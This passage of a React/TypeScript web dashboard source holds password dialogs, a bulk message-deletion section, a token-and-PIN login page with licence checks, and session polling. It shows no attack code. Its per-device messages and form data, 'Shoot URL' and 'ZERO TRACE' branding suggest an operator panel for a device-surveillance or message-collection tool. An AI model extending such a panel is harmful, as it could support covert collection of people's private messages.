            <input autoFocus autoComplete="new-password" value={dpPinInput} onChange={e => { setDpPinInput(e.target.value); setDpToggleErr(""); }} onKeyDown={e => { if (e.key === "Enter" && dpPinInput && !dpLoading) void dpToggle(); }} type="password" placeholder="Delete password" style={{ padding: "10px 14px", borderRadius: 9, border: `1.5px solid ${dpToggleErr ? "#ef4444" : t.cardB}`, background: t.hdr, color: t.txt, fontSize: 14, outline: "none" }} />
            {dpToggleErr && <div style={{ fontSize: 12, color: "#ef4444", marginTop: -8 }}>{dpToggleErr}</div>}
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => { setDpShowToggleDialog(false); setDpPinInput(""); setDpToggleErr(""); }} disabled={dpLoading} style={{ flex: 1, padding: "10px 0", borderRadius: 9, background: t.hdr, border: `1px solid ${t.cardB}`, color: t.txt, fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Cancel</button>
              <button onClick={() => void dpToggle()} disabled={dpLoading || !dpPinInput} style={{ flex: 1, padding: "10px 0", borderRadius: 9, background: dpEnabled ? "#ef4444" : "#22c55e", border: "none", color: "#fff", fontSize: 13, fontWeight: 700, cursor: dpLoading || !dpPinInput ? "not-allowed" : "pointer", opacity: dpLoading || !dpPinInput ? 0.6 : 1 }}>{dpLoading ? "…" : dpEnabled ? "Disable" : "Enable"}</button>
            </div>
          </div>
        </div>,
        document.body
      )}

      {/* ── Delete Protection — Change Password Dialog ── */}
      {dpShowChangePinDialog && createPortal(
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.6)", zIndex: 1000, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
          onClick={e => { if (e.target === e.currentTarget && !dpLoading) { setDpShowChangePinDialog(false); setDpCurrentPin(""); setDpPinNew(""); setDpChangePinErr(""); } }}>
          <div style={{ background: t.card, borderRadius: 14, width: "100%", maxWidth: 320, padding: 24, display: "flex", flexDirection: "column", gap: 14, boxShadow: "0 8px 40px rgba(0,0,0,0.35)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
              <div style={{ width: 38, height: 38, borderRadius: 10, background: `${t.accent}15`, display: "flex", alignItems: "center", justifyContent: "center" }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke={t.accent} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
              </div>
              <div>
                <div style={{ fontWeight: 800, fontSize: 14, color: t.txt }}>Change Password</div>
                <div style={{ fontSize: 11, color: t.muted, marginTop: 1 }}>Update your delete protection password</div>
              </div>
            </div>
            <input autoFocus autoComplete="current-password" value={dpCurrentPin} onChange={e => { setDpCurrentPin(e.target.value); setDpChangePinErr(""); }} type="password" placeholder="Current password" style={{ padding: "10px 14px", borderRadius: 9, border: `1.5px solid ${dpChangePinErr ? "#ef4444" : t.cardB}`, background: t.hdr, color: t.txt, fontSize: 14, outline: "none" }} />
            <input autoComplete="new-password" value={dpPinNew} onChange={e => { setDpPinNew(e.target.value); setDpChangePinErr(""); }} onKeyDown={e => { if (e.key === "Enter" && dpCurrentPin && dpPinNew.length >= 4 && !dpLoading) void dpChangePin(); }} type="password" placeholder="New password (min 4 chars)" style={{ padding: "10px 14px", borderRadius: 9, border: `1.5px solid ${dpChangePinErr ? "#ef4444" : t.cardB}`, background: t.hdr, color: t.txt, fontSize: 14, outline: "none" }} />
            {dpChangePinErr && <div style={{ fontSize: 12, color: "#ef4444", marginTop: -6 }}>{dpChangePinErr}</div>}
            <div style={{ display: "flex", gap: 8 }}>
              <button onClick={() => { setDpShowChangePinDialog(false); setDpCurrentPin(""); setDpPinNew(""); setDpChangePinErr(""); }} disabled={dpLoading} style={{ flex: 1, padding: "10px 0", borderRadius: 9, background: t.hdr, border: `1px solid ${t.cardB}`, color: t.txt, fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Cancel</button>
              <button onClick={() => void dpChangePin()} disabled={dpLoading || !dpCurrentPin || dpPinNew.length < 4} style={{ flex: 1, padding: "10px 0", borderRadius: 9, background: t.accent, border: "none", color: "#fff", fontSize: 13, fontWeight: 700, cursor: dpLoading || !dpCurrentPin || dpPinNew.length < 4 ? "not-allowed" : "pointer", opacity: dpLoading || !dpCurrentPin || dpPinNew.length < 4 ? 0.6 : 1 }}>{dpLoading ? "…" : "Update"}</button>
            </div>
          </div>
        </div>,
        document.body
      )}

      {/* ── Generate Shoot URL — Info Dialog ── */}
      {shootUrlDialog && createPortal(
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.6)", zIndex: 1000, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
          onClick={e => { if (e.target === e.currentTarget) setShootUrlDialog(false); }}>
          <div style={{ background: t.card, borderRadius: 14, width: "100%", maxWidth: 320, padding: 24, display: "flex", flexDirection: "column", gap: 16, boxShadow: "0 8px 40px rgba(0,0,0,0.35)" }}>
            <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
              <div style={{ width: 42, height: 42, borderRadius: 12, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0, boxShadow: "0 4px 12px rgba(99,102,241,0.4)" }}>
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#fff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
              </div>
              <div>
                <div style={{ fontWeight: 800, fontSize: 15, color: t.txt }}>Generate Shoot URL</div>
                <div style={{ display: "inline-flex", alignItems: "center", marginTop: 4, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", borderRadius: 99, padding: "2px 8px" }}>
                  <span style={{ fontSize: 10, fontWeight: 800, color: "#fff", letterSpacing: 0.5 }}>NEW IN v7.0</span>
                </div>
              </div>
            </div>
            <div style={{ background: t.hdr, borderRadius: 10, padding: "12px 14px", border: `1px solid ${t.cardB}` }}>
              <div style={{ fontSize: 13, color: t.txt, lineHeight: 1.6 }}>
                This feature has been removed from older versions.
              </div>
              <div style={{ fontSize: 13, color: t.muted, lineHeight: 1.6, marginTop: 6 }}>
                Generate Shoot URL is now available on <span style={{ fontWeight: 700, color: t.txt }}>version 7.0 and above</span>.
              </div>
            </div>
            <button
              onClick={() => setShootUrlDialog(false)}
              style={{ padding: "11px 0", borderRadius: 9, background: "linear-gradient(135deg,#6366f1,#8b5cf6)", border: "none", color: "#fff", fontSize: 13, fontWeight: 700, cursor: "pointer", boxShadow: "0 4px 12px rgba(99,102,241,0.35)" }}>
              Got it
            </button>
          </div>
        </div>,
        document.body
      )}

      {/* ── Delete All Messages (Danger Zone) ── */}
      {!dpEnabled && <DeleteAllMessagesSection appId={appId} onDeleted={() => {}} msgCount={msgCount} />}

    </div>
  );
}

/* ════════════════════════════════════════
   DELETE ALL MESSAGES SECTION
════════════════════════════════════════ */
function fmtSecs(s: number): string {
  if (s < 60) return `${Math.ceil(s)}s`;
  const m = Math.floor(s / 60), rem = Math.ceil(s % 60);
  return rem > 0 ? `${m}m ${rem}s` : `${m}m`;
}

function DeleteAllMessagesSection({ appId, onDeleted, msgCount }: { appId: string; onDeleted: () => void; msgCount: number }) {
  const t = useTheme();
  const [showDialog, setShowDialog] = useState(false);
  const [phase, setPhase] = useState<"idle" | "fetching" | "deleting" | "done" | "err">("idle");
  const [resultMsg, setResultMsg] = useState("");
  const [total, setTotal] = useState(0);
  const [deleted, setDeleted] = useState(0);
  const startTimeRef = useRef<number>(0);
  const cancelRef = useRef(false);

  function openDialog() {
    cancelRef.current = false;
    setShowDialog(true); setPhase("idle"); setResultMsg(""); setTotal(0); setDeleted(0);
  }
  function closeDialog() {
    cancelRef.current = true;
    setShowDialog(false); setPhase("idle"); setResultMsg(""); setTotal(0); setDeleted(0);
  }

  async function handleConfirm() {
    cancelRef.current = false;
    try {
      // Single bulk DELETE — server deletes all in one SQL query
      setPhase("deleting");
      startTimeRef.current = Date.now();
      const r = await apiFetch(`/api/messages?appId=${encodeURIComponent(appId)}`, { method: "DELETE" });
      if (!r.ok) { setPhase("err"); setResultMsg(`Delete failed (${r.status}).`); return; }
      const data = await r.json() as { deleted?: number };
      const count = data.deleted ?? msgCount;
      setTotal(count); setDeleted(count);
      setPhase("done"); setResultMsg(`${count.toLocaleString()} messages deleted successfully.`);
      onDeleted();
      setTimeout(() => closeDialog(), 3000);
    } catch { setPhase("err"); setResultMsg("Network error. Try again."); }
  }

  const pct = total > 0 ? Math.round((deleted / total) * 100) : 0;
  const elapsedSec = phase === "deleting" && startTimeRef.current > 0 ? (Date.now() - startTimeRef.current) / 1000 : 0;
  const speed = elapsedSec > 1 ? deleted / elapsedSec : 0;
  const etaSec = speed > 0 && deleted < total ? (total - deleted) / speed : null;
  const busy = phase === "fetching" || phase === "deleting";

  return (
    <>
      <div style={{ background: t.card, borderRadius: 10, border: "1.5px solid #f87171", overflow: "hidden" }}>
        <div style={{ padding: "10px 14px", borderBottom: "1px solid #f87171", background: "#fef2f2", display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{ fontSize: 16 }}>🗑️</span>
          <span style={{ fontWeight: 800, fontSize: 13, color: "#dc2626" }}>Danger Zone</span>
        </div>
        <div style={{ padding: 14, display: "flex", flexDirection: "column", gap: 10 }}>
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "6px 0" }}>
            <span style={{ fontSize: 12, color: t.muted }}>Total Messages</span>
            <span style={{ fontSize: 16, fontWeight: 800, color: "#dc2626" }}>{msgCount.toLocaleString()}</span>
          </div>
          <button onClick={openDialog} style={{ padding: "10px 16px", borderRadius: 8, border: "1.5px solid #ef4444", background: "#fef2f2", color: "#dc2626", fontWeight: 700, fontSize: 13, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: 6 }}>
            🗑️ Delete All Messages
          </button>
        </div>
      </div>

      {showDialog && createPortal(
        <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.6)", zIndex: 1000, display: "flex", alignItems: "center", justifyContent: "center", padding: 16 }}
          onClick={e => { if (e.target === e.currentTarget && !busy) closeDialog(); }}
        >
          <div style={{ background: t.card, borderRadius: 14, width: "100%", maxWidth: 400, padding: 24, display: "flex", flexDirection: "column", gap: 16, boxShadow: "0 8px 40px rgba(0,0,0,0.35)" }}>
            <div>
              <div style={{ fontWeight: 800, fontSize: 15, color: "#dc2626", marginBottom: 6 }}>⚠️ Delete All Messages</div>
              <div style={{ fontSize: 12, color: t.muted, lineHeight: 1.6 }}>
                <span style={{ fontFamily: "monospace", fontWeight: 700, color: t.accent }}>{appId}</span> ke <strong style={{ color: "#dc2626" }}>{msgCount.toLocaleString()} messages</strong> permanently delete honge.
              </div>
            </div>

{phase === "fetching" && (
              <div style={{ display: "flex", alignItems: "center", gap: 10, padding: "4px 0" }}>
                <CircularLoader size={18} color={t.accent} />
                <span style={{ fontSize: 13, color: t.txt2 }}>Loading messages for <span style={{ fontFamily: "monospace", color: t.accent }}>{appId}</span>…</span>
              </div>
            )}

            {phase === "deleting" && (
              <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: 12, color: t.txt2, fontWeight: 600 }}>
                  <span>Deleted: <span style={{ color: "#ef4444", fontWeight: 800 }}>{deleted.toLocaleString()}</span> / {total.toLocaleString()}</span>
                  <span style={{ color: "#ef4444" }}>{pct}%</span>
                </div>
                <div style={{ height: 10, borderRadius: 99, background: t.hdrB, overflow: "hidden" }}>
                  <div style={{ height: "100%", borderRadius: 99, background: "linear-gradient(90deg,#ef4444,#dc2626)", width: `${pct}%`, transition: "width 0.3s ease" }} />
                </div>
                <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: t.muted }}>
                  <span>Speed: ~{speed > 0 ? Math.round(speed) : "—"} msg/s</span>
                  {etaSec !== null ? <span>Est. remaining: <strong style={{ color: t.txt2 }}>{fmtSecs(etaSec)}</strong></span> : <span>Calculating…</span>}
                </div>
              </div>
            )}

            {phase === "done" && <div style={{ textAlign: "center", color: "#16a34a", fontWeight: 700, fontSize: 13, padding: "8px 0" }}>✅ {resultMsg}</div>}
            {phase === "err" && <div style={{ color: "#dc2626", fontSize: 12 }}>❌ {resultMsg}</div>}

            {(phase === "idle" || phase === "err") && (
              <div style={{ display: "flex", gap: 8 }}>
                <button onClick={closeDialog} style={{ flex: 1, padding: "10px 0", borderRadius: 8, border: `1px solid ${t.cardB}`, background: t.bg, color: t.txt2, fontSize: 13, fontWeight: 600, cursor: "pointer" }}>Cancel</button>
                <button onClick={() => void handleConfirm()} style={{ flex: 1, padding: "10px 0", borderRadius: 8, border: "none", background: "#ef4444", color: "#fff", fontSize: 13, fontWeight: 700, cursor: "pointer" }}>
                  {phase === "err" ? "Retry" : "Delete All"}
                </button>
              </div>
            )}
          </div>
        </div>,
        document.body
      )}
    </>
  );
}

/* ════════════════════════════════════════
   LOGIN PAGE
════════════════════════════════════════ */
export function LoginPage({ onAuth, onSetAppId, prefillAppId }: { onAuth: () => void; onSetAppId: (id: string) => void; prefillAppId?: string }) {
  const t = useTheme();
  const [inputAppId, setInputAppId] = useState(prefillAppId || "");
  const [pin, setPin] = useState("");
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);
  const [lockSecs, setLockSecs] = useState(0);

  useEffect(() => {
    setInputAppId(prefillAppId || "");
  }, [prefillAppId]);

  useEffect(() => {
    if (lockSecs <= 0) return;
    const iv = setInterval(() => setLockSecs(p => { if (p <= 1) { clearInterval(iv); return 0; } return p - 1; }), 1000);
    return () => clearInterval(iv);
  }, [lockSecs > 0]);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    const appId = inputAppId.trim();
    if (!appId) { setErr("Please enter your token."); return; }
    if (!pin) { setErr("Please enter your PIN."); return; }
    setLoading(true); setErr("");
    const panelToken = localStorage.getItem(`mrrobot_panel_token_${appId}`) ?? new URLSearchParams(window.location.search).get("pt") ?? "";
    try {
      const r = await fetch(`/api/apps/${encodeURIComponent(appId)}/verify-pin`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pin, panelToken }),
      });
      if (!r.ok) {
        const j = await r.json().catch(() => ({} as { error?: string }));
        const apiErr = (j as { error?: string }).error ?? "";
        if (r.status === 429) {
          const secMatch = apiErr.match(/(\d+)\s*sec/);
          const minMatch = apiErr.match(/(\d+)\s*min/);
          const secs = secMatch ? parseInt(secMatch[1]) : minMatch ? parseInt(minMatch[1]) * 60 : 120;
          setLockSecs(secs); setErr(""); setPin(""); return;
        }
        setErr(
          apiErr.includes("expired") || apiErr.includes("Licence") ? "Licence expired. Contact admin." :
          apiErr.includes("disabled") ? "App disabled. Contact admin." :
          apiErr.includes("Wrong PIN") || apiErr.includes("attempt") ? "Wrong PIN. Try again." :
          apiErr || "Login failed. Try again."
        );
        setPin(""); return;
      }
      const sessR = await fetch("/api/admin/sessions", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ appId, pin, panelToken, deviceId: getDeviceId() }),
      }).catch(() => null);
      if (!sessR || !sessR.ok) {
        const j = sessR ? await sessR.json().catch(() => ({} as {error?:string})) : {};
        setErr(!sessR ? "Network error." : (j as {error?:string}).error || "Login failed."); return;
      }
      const { sessionId, token: _subJwt } = await sessR.json() as { sessionId: string; token?: string };
      if (!sessionId || !_subJwt) { setErr("Login response was incomplete. Please try again."); return; }
      localStorage.setItem(`mrrobot_session_id_${appId}`, sessionId);
      if (panelToken) localStorage.setItem(`mrrobot_panel_token_${appId}`, panelToken);
      sessionStorage.setItem(`mrrobot_jwt_${appId}`, _subJwt);
      sessionStorage.setItem("mrrobot_active_appid", appId);
      onSetAppId(appId);
      localStorage.setItem(`mrrobot_auth_${appId}`, "1");
      onAuth();
    } catch { setErr("Network error. Try again."); }
    finally { setLoading(false); }
  }

  const BG = "#0a0f1a";
  const CARD = "#111827";
  const BORDER = "#1e293b";
  const ACCENT = t.accent;
  const inputStyle: React.CSSProperties = {
    width: "100%", padding: "12px 14px", borderRadius: 10,
    border: `1.5px solid ${err ? "#ef4444" : "#334155"}`,
    background: "#1e293b", color: "#f1f5f9",
    fontSize: 14, outline: "none", boxSizing: "border-box",
  };
  const labelStyle: React.CSSProperties = {
    fontSize: 12, color: "#94a3b8", fontWeight: 600,
    textTransform: "uppercase", letterSpacing: 0.5, marginBottom: 6, display: "block",
  };

  return (
    <div style={{
      minHeight: "100vh", background: BG,
      display: "flex", alignItems: "center", justifyContent: "center",
      fontFamily: "system-ui,-apple-system,'Segoe UI',sans-serif", padding: 16,
    }}>
      <style>{`@keyframes mrSlide{0%{transform:translateX(-100%)}100%{transform:translateX(350%)}}`}</style>
      <div style={{ width: "100%", maxWidth: 380 }}>
        <div style={{ background: CARD, borderRadius: 18, padding: "32px 28px", border: `1px solid ${BORDER}`, boxShadow: "0 20px 60px #00000080" }}>
          <div style={{ display: "flex", justifyContent: "center", marginBottom: 20 }}>
            <svg width="52" height="52" viewBox="0 0 34 34" fill="none">
              <line x1="17" y1="1" x2="17" y2="7" stroke={ACCENT} strokeWidth="1.8" strokeLinecap="round"/>
              <circle cx="17" cy="1.5" r="2" fill={ACCENT}/>
              <rect x="3" y="7" width="28" height="22" rx="5" fill="#1e293b" stroke={ACCENT} strokeWidth="1.5"/>
              <rect x="8" y="13" width="6" height="6" rx="1.5" fill={ACCENT}/>
              <rect x="20" y="13" width="6" height="6" rx="1.5" fill={ACCENT}/>
              <rect x="2" y="16" width="2" height="5" rx="1" fill="#334155"/>
              <rect x="30" y="16" width="2" height="5" rx="1" fill="#334155"/>
              <rect x="8" y="22" width="18" height="4" rx="1.5" fill="#0f172a"/>
              <rect x="10" y="22" width="3" height="4" rx="1" fill={ACCENT}/>
              <rect x="15.5" y="22" width="3" height="4" rx="1" fill={ACCENT}/>
              <rect x="21" y="22" width="3" height="4" rx="1" fill={ACCENT}/>
            </svg>
          </div>
          <div style={{ textAlign: "center", marginBottom: 28 }}>
            <div style={{ color: "#f8fafc", fontWeight: 900, fontSize: 22, letterSpacing: 1 }}>Welcome Back, Admin</div>
            {inputAppId && <div style={{ color: "#475569", fontSize: 11, marginTop: 4, fontFamily: "monospace", fontWeight: 700 }}>{inputAppId}</div>}
          </div>
          <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: 16 }}>
            <div>
              <label style={labelStyle}>Token ID</label>
              <div style={{ position: "relative", display: "flex", alignItems: "center" }}>
                <input
                  value={inputAppId}
                  onChange={e => { setInputAppId(e.target.value.trim()); setErr(""); }}
                  placeholder="Enter your token"
                  autoFocus={!prefillAppId}
                  autoCapitalize="none"
                  spellCheck={false}
                  readOnly={!!prefillAppId}
                  style={{ ...inputStyle, color: prefillAppId ? ACCENT : "#f1f5f9", fontFamily: "monospace", letterSpacing: 1, paddingRight: prefillAppId ? 44 : 14, cursor: prefillAppId ? "default" : "text" }}
                />
                {!!prefillAppId && (
                  <div style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)" }}>
                    <CopyIconButton value={inputAppId} size={28} color={ACCENT} title="Copy Token ID" />
                  </div>
                )}
              </div>
            </div>
            <div>
              <label style={labelStyle}>PIN</label>
              <input
                type="password"
                value={pin}
                onChange={e => { setPin(e.target.value); setErr(""); }}
                placeholder="Enter PIN"
                autoFocus={!!prefillAppId}
                autoComplete="current-password"
                style={{ ...inputStyle, fontFamily: "system-ui", letterSpacing: 2 }}
              />
            </div>
            {lockSecs > 0 && (
              <div style={{ background: "#1c1c1e", border: "1.5px solid #ef4444", borderRadius: 10, padding: "12px 16px", textAlign: "center" }}>
                <div style={{ fontSize: 22, fontWeight: 800, color: "#ef4444", letterSpacing: 2 }}>
                  {String(Math.floor(lockSecs / 60)).padStart(2, "0")}:{String(lockSecs % 60).padStart(2, "0")}
                </div>
                <div style={{ color: "#f87171", fontSize: 12, marginTop: 4, fontWeight: 600 }}>Too many wrong attempts — account locked</div>
              </div>
            )}
            {lockSecs === 0 && err && <div style={{ color: "#f87171", fontSize: 12, textAlign: "center", fontWeight: 600 }}>{err}</div>}
            {loading && (
              <>
                <div style={{ width: "100%", height: 3, background: "#1e293b", borderRadius: 99, overflow: "hidden" }}>
                  <div style={{ height: "100%", width: "30%", borderRadius: 99, background: ACCENT, animation: "mrSlide 1.1s ease-in-out infinite" }} />
                </div>
                <div style={{ textAlign: "center", fontSize: 11, color: "#64748b", fontWeight: 600, letterSpacing: 0.5 }}>Verifying…</div>
              </>
            )}
            <button type="submit" disabled={loading || lockSecs > 0 || !inputAppId.trim() || !pin} style={{
              width: "100%", background: lockSecs > 0 ? "#374151" : ACCENT,
              color: lockSecs > 0 ? "#6b7280" : "#fff", border: "none",
              borderRadius: 10, padding: "13px", fontSize: 14, fontWeight: 700,
              cursor: loading || lockSecs > 0 || !inputAppId.trim() || !pin ? "not-allowed" : "pointer",
            }}>{lockSecs > 0 ? `Locked (${String(Math.floor(lockSecs / 60)).padStart(2, "0")}:${String(lockSecs % 60).padStart(2, "0")})` : loading ? "Verifying…" : "Sign In"}</button>
          </form>
        </div>
        <div style={{ textAlign: "center", marginTop: 24, color: "#334155", fontSize: 11, fontWeight: 600 }}>
          Build: {BUILD_VERSION}
        </div>
      </div>
    </div>
  );
}

/* ════════════════════════════════════════
   ROOT
════════════════════════════════════════ */
export default function WebDashboard() {
  // appId is no longer in the URL — it's entered by the user at login and stored in sessionStorage
  const [appId, setAppId] = useState<string>(() => sessionStorage.getItem("mrrobot_active_appid") || "");

  const DEVICE_KEY = `mrrobot_device_id_${appId}`;
  const [appName, setAppName] = useState("");
  const [authed, setAuthed] = useState<boolean>(() => {
    const aid = sessionStorage.getItem("mrrobot_active_appid") || "";
    return !!aid && localStorage.getItem(`mrrobot_auth_${aid}`) === "1";
  });
  const [devices, setDevices] = useState<DbDevice[]>([]);
  const [messages, setMessages] = useState<DbMessage[]>([]);
  const [formData, setFormData] = useState<DbFormData[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  // Stale-session guard: if marked authed but no JWT → force re-login
  useEffect(() => {
    const aid = sessionStorage.getItem("mrrobot_active_appid") || "";
    const hasJwt = !!aid && !!sessionStorage.getItem(`mrrobot_jwt_${aid}`);
    if (!hasJwt) {
      if (aid) {
        localStorage.removeItem(`mrrobot_auth_${aid}`);
        localStorage.removeItem(`mrrobot_session_id_${aid}`);
      }
      setAuthed(false);
    }
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    apiFetch(`/api/apps/${appId}`).then(r => r.ok ? r.json() : null).then(app => { if (app?.name) setAppName(app.name); }).catch(() => {});
  }, [appId]);

  // Poll app status every 10s — force logout if app is disabled
  useEffect(() => {
    if (!authed) return;
    async function checkAppStatus() {
      try {
        const r = await apiFetch(`/api/apps/${appId}`, { headers: { "x-silent": "1" } });
        if (!r.ok) return;
        const app = await r.json() as { status: string; name?: string };
        if (app.name) setAppName(app.name);
        if (app.status !== "active") {
          const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
          if (sid) apiFetch(`/api/admin/sessions/${sid}`, { method: "DELETE" }).catch(() => {});
          localStorage.removeItem(`mrrobot_auth_${appId}`);
          localStorage.removeItem(`mrrobot_session_id_${appId}`);
          sessionStorage.removeItem(`mrrobot_jwt_${appId}`);
          setAuthed(false);
        }
      } catch { /* ignore network errors */ }
    }
    checkAppStatus();
    const t = setInterval(checkAppStatus, 10000);
    return () => clearInterval(t);
  }, [authed, appId]);

  // Global session ping every 15s — if my session was killed (Logout All from
  // another device), the server returns 404 and we force-logout here too.
  // 2 consecutive 404s required to ignore transient network errors.
  useEffect(() => {
    if (!authed) return;
    let misses = 0;
    async function pingSession() {
      const sid = localStorage.getItem(`mrrobot_session_id_${appId}`);
      if (!sid) return; // No session to ping — JWT alone handles auth
      try {
        const r = await apiFetch(`/api/admin/sessions/${sid}/ping`, {
          method: "PATCH",
          headers: { "x-silent": "1" },
        });
        if (r.status === 404) {
          misses += 1;
          if (misses >= 2) {
            localStorage.removeItem(`mrrobot_auth_${appId}`);
            localStorage.removeItem(`mrrobot_session_id_${appId}`);
            sessionStorage.removeItem(`mrrobot_jwt_${appId}`);
            setAuthed(false);
          }
        } else if (r.ok) {
          misses = 0;
        }
      } catch { /* ignore network errors */ }
    }
    pingSession();
    const t = setInterval(pingSession, 600000);
    return () => clearInterval(t);
  }, [authed, appId]);

  const [darkMode, setDarkMode] = useState<boolean>(() => localStorage.getItem("mrrobot_dark") === "1");
  const [deleteProtEnabled, setDeleteProtEnabled] = useState(false);
  const [totalMsgCount, setTotalMsgCount] = useState(0);
  // ── Dynamic notice ticker ──
  const [tickerNotices, setTickerNotices] = useState<string[]>([]);
  useEffect(() => {
    async function fetchNotice() {
      try {
        const r = await fetch("/api/notice");
        if (!r.ok) return;
        const d = await r.json() as { notices: Array<{ id: number; text: string }> };
        setTickerNotices((d.notices || []).map(n => n.text).filter(Boolean));
      } catch { /* silent */ }
    }
    void fetchNotice();
    const iv = setInterval(() => void fetchNotice(), 60_000); // refresh every 60s
    return () => clearInterval(iv);
  }, []);

  // Load delete protection status on mount so ALL tabs see correct state immediately
  useEffect(() => {
    if (!authed) return;
    apiFetch(`/api/apps/${appId}/delete-protection?t=${Date.now()}`, { cache: "no-store" })
      .then(r => r.ok ? r.json() : null)
      .then((d: { enabled?: boolean } | null) => { if (d != null) setDeleteProtEnabled(!!d.enabled); })
      .catch(() => {});
  }, [authed, appId]);

  // Zero Trace = day mode only, no dark toggle
  const isZeroTrace = appName === "ZERO TRACE";
  const effectiveDark = isZeroTrace ? false : darkMode;

  function toggleDark() {
    if (isZeroTrace) return; // Zero Trace is always day mode
    setDarkMode(d => {
      const next = !d;
      localStorage.setItem("mrrobot_dark", next ? "1" : "0");
      return next;
    });
  }

  const VALID_PAGES: Page[] = ["home", "messages", "groups", "devices", "settings"];
  const [page, setPage] = useState<Page>(() => {
    const saved = localStorage.getItem("mrrobot_page") as Page | null;
    return saved && VALID_PAGES.includes(saved) ? saved : "home";
  });
  const [selectedDevice, setSelectedDevice] = useState<DbDevice | null>(null);
  const [backPage, setBackPage] = useState<Page>(() => {
    const saved = localStorage.getItem("mrrobot_back_page") as Page | null;
    return saved && VALID_PAGES.includes(saved) ? saved : "home";
  });
  const [scrollToMsgId, setScrollToMsgId] = useState<string | null>(null);
  const [checkAllState, setCheckAllState] = useState<"idle" | "running" | "done">("idle");
  const [checkAllDone, setCheckAllDone] = useState(0);
  const [checkAllTotal, setCheckAllTotal] = useState(0);
  const [checkAllResult, setCheckAllResult] = useState<{ ok: number; fail: number } | null>(null);
  const [filterRecent, setFilterRecent] = useState(false);
  const [filterFavorites, setFilterFavorites] = useState(false);
  const [refreshing, setRefreshing] = useState(false);
  const [wsConnected, setWsConnected] = useState(false);
  const [, liveTick] = useState(0); // global 1s tick — drives live timeAgo on all device cards
  useEffect(() => {
    const t = setInterval(() => liveTick(n => n + 1), 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => { localStorage.setItem("mrrobot_page", page); }, [page]);

  // Scroll state: track back vs forward navigation
  const goingBackRef = useRef(false);
  const savedScrollTopRef = useRef(0); // pixel scrollTop saved on forward nav, restored on back
  const homeMsgCountRef = useRef(20);  // how many items HomePage had when user navigated away
  const msgPageCountRef = useRef(20);  // how many items MessagesPage had when user navigated away
  const groupsCountRef = useRef(15);   // how many group items GroupsPage had when user navigated away
  const devicesCountRef = useRef(20);  // how many device items DevicesPage had when user navigated away

  // Scroll to top on forward nav, restore exact scrollTop on back nav.
  // When we have a target msgId, the per-page scrollToMsgId effect will do a
  // precise scrollIntoView once the card mounts — skip the pixel restore in
  // that case to avoid fighting it.
  useEffect(() => {
    const el = document.getElementById("main-scroll");
    if (!el) return;
    if (goingBackRef.current) {
      goingBackRef.current = false;
      const savedTop = savedScrollTopRef.current;
      // If a target message is set, let scrollIntoView handle precise alignment.
      // Just land near the saved pixel as a starting point so content-visibility
      // cards have a chance to render before scrollIntoView fires.
      el.scrollTop = savedTop;
      if (scrollToMsgId) return;
      // No target msgId — keep retrying pixel restore until layout settles
      let attempts = 0;
      const tryRestore = () => {
        el.scrollTop = savedTop;
        if (Math.abs(el.scrollTop - savedTop) > 10 && attempts < 50) {
          attempts++;
          setTimeout(tryRestore, 50);
        }
      };
      requestAnimationFrame(tryRestore);
    } else {
      el.scrollTo({ top: 0, behavior: "instant" });
    }
  }, [page]); // eslint-disable-line react-hooks/exhaustive-deps

  function onOpenDevice(device: DbDevice, msgId?: string) {
    // Save scrollTop of the list container at the moment of navigation
    const scrollEl = document.getElementById("main-scroll");
    savedScrollTopRef.current = scrollEl?.scrollTop ?? 0;
    setBackPage(page);
    localStorage.setItem("mrrobot_back_page", page);
    setSelectedDevice(device);
    setPage("devices");
    localStorage.setItem(DEVICE_KEY, device.deviceId);
    if (msgId) setScrollToMsgId(msgId);
  }

  function onBack() {
    goingBackRef.current = true;
    setSelectedDevice(null);
    setPage(backPage);
    localStorage.removeItem(DEVICE_KEY);
    localStorage.removeItem("mrrobot_back_page");
  }

  const loadData = useCallback(async (silent = false) => {
    if (!silent) setLoading(true);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 25000);
    const FIRST_PAGE = 500;
    const PAGE_SIZE = 1000;
    try {
      const h: HeadersInit = silent ? { "x-silent": "1" } : {};
